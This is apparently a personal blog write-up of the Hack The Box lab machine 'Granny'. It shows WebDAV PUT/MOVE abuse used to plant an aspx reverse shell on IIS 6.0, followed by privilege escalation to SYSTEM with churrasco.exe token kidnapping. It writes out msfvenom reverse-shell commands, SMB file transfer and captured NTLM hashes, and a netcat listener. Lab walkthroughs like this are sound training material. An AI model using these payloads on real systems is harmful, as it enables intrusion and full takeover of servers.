![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-12.04.56-PM.png)

IP: 10.10.10.15, Microsoft IIS httpd 6.0 – Windows server 2003

## Enumeration

We begin by performing a basic nmap scan: `sudo nmap -sC -sV -O -p- -oA nmap/granny 10.10.10.15`

Open ports:

- 80

Our nmap scan showed that there are some WEB DAV methods which we can use such as:  
PUT, MOVE, DELETE, etc.

So to test this, we just simply upload a txt file and check if its getting uploaded.

![](http://vedanttare.com/wp-content/uploads/2022/04/upload-text-file.png)  
And boom!!! txt files can be uploaded to the server.

![](http://vedanttare.com/wp-content/uploads/2022/04/uploaded-txt-file.png)

## Exploitation

So, as we know that we can use PUT method to upload files(txt). Now, lets see if we can upload asp or aspx files as iis server mostly supports those extensions. But, unfortunately we were not able to upload asp or aspx files using PUT method.

Lets run davtest to check which file extensions are allowed to be uploaded.

![](http://vedanttare.com/wp-content/uploads/2022/04/davtest.png)

From the davtest output we can see that we are only able to execute txt and html files on the web server via DAV method(PUT). In this case we need to trick the web server into thinking that it is a txt file only. The web server is allowing us to only upload txt file….this is what its checking for…but we can move the txt file to a .aspx flie…(here the web server does not check anything).

We can see that we have to MOVE method available to us. We can generate a .aspx rev shell and copy the contents in a txt file and then using PUT upload it on the web server. Then, using MOVE method we can move it to a .aspx file.

![](http://vedanttare.com/wp-content/uploads/2022/04/move-method.png)

We can see that the MOVE method is successful:

![](http://vedanttare.com/wp-content/uploads/2022/04/move-success.png)

Using `msfvenom` to generate a reverse shell:

`kali@starscorp1o:~/htb/boxes/granny$ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.4 LPORT=5555 -f aspx > shell.aspx<br></br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br></br>[-] No arch selected, selecting arch: x86 from the payload<br></br>No encoder or badchars specified, outputting raw payload<br></br>Payload size: 341 bytes<br></br>Final size of aspx file: 2808 bytes`

We can see from the burp repeater response tab that the file has been successfully created. Let’s setup a reverse listener on our machine and navigate to the file to get back a connection.

And BOOM!!! We get a low privilege shell.

## Privilege Escalation

Using a KERNEL exploit available for the system:

Just by googling the kernel version like:  
`Windows server 2003 sp2 local privesc`

If it doesn’t work use metasploit(most people have used it, don’t think it works without metasploit). After checking for privileges on the system:

`C:\temp>whoami /priv<br></br>whoami /priv`

## PRIVILEGES INFORMATION

`Privilege Name Description State<br></br>============================= ========================================= ========<br></br>SeAuditPrivilege Generate security audits Disabled<br></br>SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled<br></br>SeAssignPrimaryTokenPrivilege Replace a process level token Disabled<br></br>SeChangeNotifyPrivilege Bypass traverse checking Enabled<br></br>SeImpersonatePrivilege Impersonate a client after authentication Enabled<br></br>SeCreateGlobalPrivilege Create global objects Enabled`

![](http://vedanttare.com/wp-content/uploads/2022/04/whoamipriv.png)

We can see that the SeImpersonatePrivilege is enabled, which is very good for us. This allows us to use a method called **token hijacking.**

Basically, Server 2003 allows for the NETWORK SERVICE and LOCAL SERVICE accounts to impersonate the SYSTEM account, if this privilege is enabled. This presentation gives a great breakdown of it in a more technical sense: https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf

So, there is a program called churrasco.exe which will let us escalate privileges. Setting up a smbserver on our kali machine to transfer files as it will be easier:

![](http://vedanttare.com/wp-content/uploads/2022/04/smb-server.png)

`kali@starscorp1o:~/htb/boxes/granny$ sudo impacket-smbserver granny .<br></br>\Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation`

`[<em>] Config file parsed [</em>] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0<br></br>[<em>] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [</em>] Config file parsed<br></br>[<em>] Config file parsed [</em>] Config file parsed<br></br>[<em>] Incoming connection (10.10.10.15,1042) [</em>] AUTHENTICATE_MESSAGE (\,GRANNY)<br></br>[<em>] User GRANNY\ authenticated successfully [</em>] :::00::4141414141414141<br></br>[<em>] AUTHENTICATE_MESSAGE (HTB\GRANNY$,GRANNY) [</em>] User GRANNY\GRANNY$ authenticated successfully<br></br>[<em>] GRANNY$::HTB:d6c9616bf8ef0bab00000000000000000000000000000000:ba22d6229d766032c4a5079646d337dae216805b60186f8e:4141414141414141 [</em>] Closing down connection (10.10.10.15,1042)<br></br>[<em>] Remaining connections [] [</em>] Incoming connection (10.10.10.15,1044)<br></br>[<em>] AUTHENTICATE_MESSAGE (HTB\GRANNY$,GRANNY) [</em>] User GRANNY\GRANNY$ authenticated successfully<br></br>[*] GRANNY$::HTB:7c1efbf67d267f4b00000000000000000000000000000000:196c496c81d0a371427eb3d044cdf914bc3143f9fb57f37d:4141414141414141<br></br>[-] Unknown level for query path info! 0x109`

So, we have setup a smbserver on our kali machine in the granny directory. Now copying the churrasco.exe file on the windows machine:

`C:\temp>copy \10.10.14.4\granny\churrasco.exe<br></br>copy \10.10.14.4\granny\churrasco.exe<br></br>1 file(s) copied.`

![](http://vedanttare.com/wp-content/uploads/2022/04/churrasco.png)

We are able to run commands with this program:

`C:\temp>churrasco.exe whoami<br></br>churrasco.exe whoami<br></br>nt authority\system`

But we can only do that when we run this program, after that the system goes back to nt authority/network service. So, what we can do now is generate a .exe rev shell payload using msfvenom:  
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=9999 -f exe > rev.exe`

We can transfer this using the same methode(smb mode).

![](http://vedanttare.com/wp-content/uploads/2022/04/rev.png)

And, we can setup a listener on our kali machine and run the rev.exe using churrasco.exe on the windows machine:

`C:\temp>churrasco.exe -d "C:\temp\rev.exe"<br></br>churrasco.exe -d "C:\temp\rev.exe"<br></br>/churrasco/-->Current User: NETWORK SERVICE<br></br>/churrasco/-->Getting Rpcss PID …<br></br>/churrasco/-->Found Rpcss PID: 684<br></br>/churrasco/-->Searching for Rpcss threads …<br></br>/churrasco/-->Found Thread: 688<br></br>/churrasco/-->Thread not impersonating, looking for another thread…<br></br>/churrasco/-->Found Thread: 692<br></br>/churrasco/-->Thread not impersonating, looking for another thread…<br></br>/churrasco/-->Found Thread: 700<br></br>/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730<br></br>/churrasco/-->Getting SYSTEM token from Rpcss Service…<br></br>/churrasco/-->Found SYSTEM token 0x728<br></br>/churrasco/-->Running command with SYSTEM Token…<br></br>/churrasco/-->Done, command should have ran as SYSTEM!`

And BOOM!!!! We get root!

`kali@starscorp1o:~/htb/boxes/granny$ sudo nc -nlvp 1234<br></br>listening on [any] 1234 …<br></br>connect to [10.10.14.4] from (UNKNOWN) [10.10.10.15] 1052<br></br>Microsoft Windows [Version 5.2.3790]<br></br>(C) Copyright 1985-2003 Microsoft Corp.`

`C:\WINDOWS\TEMP>dir<br></br>dir<br></br>Volume in drive C has no label.<br></br>Volume Serial Number is 246C-D7FE`

`Directory of C:\WINDOWS\TEMP`

`08/30/2020 09:33 PM .<br></br>08/30/2020 09:33 PM ..<br></br>04/12/2017 10:14 PM rad61C21.tmp<br></br>04/12/2017 10:14 PM radDDF39.tmp<br></br>02/18/2007 03:00 PM 22,752 UPD55.tmp<br></br>12/24/2017 08:24 PM vmware-SYSTEM<br></br>08/30/2020 06:17 PM 10,643 vmware-vmsvc.log<br></br>12/24/2017 08:30 PM 2,294 vmware-vmusr.log<br></br>08/30/2020 06:17 PM 273 vmware-vmvss.log<br></br>4 File(s) 35,962 bytes<br></br>5 Dir(s) 18,142,490,624 bytes free`

`C:\WINDOWS\TEMP>whoami<br></br>whoami<br></br>nt authority\system`

`C:\WINDOWS\TEMP>hostname<br></br>hostname<br></br>granny`

`C:\WINDOWS\TEMP>whoami<br></br>whoami<br></br>nt authority\system`

![](http://vedanttare.com/wp-content/uploads/2022/04/rootedd.png)

We can grab the user flag:

![](http://vedanttare.com/wp-content/uploads/2022/04/user-flag.png)

And, we can grab the root flag as well,

![](http://vedanttare.com/wp-content/uploads/2022/04/root-flagg.png)

Important payloads:

![](http://vedanttare.com/wp-content/uploads/2022/04/imp-payload.png)

Check out my previous post:

<figure class="wp-block-embed is-type-wp-embed is-provider-vedant-tare wp-block-embed-vedant-tare"><div class="wp-block-embed__wrapper">> [Hackthebox – Bastion](https://vedanttare.com/hackthebox-bastion/)

<iframe class="wp-embedded-content" data-secret="0FhH9XZ1ki" frameborder="0" height="338" marginheight="0" marginwidth="0" sandbox="allow-scripts" scrolling="no" security="restricted" src="https://vedanttare.com/hackthebox-bastion/embed/#?secret=9O7GWh7sE9#?secret=0FhH9XZ1ki" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);" title="“Hackthebox – Bastion” — VEDANT TARE" width="600"></iframe></div></figure>
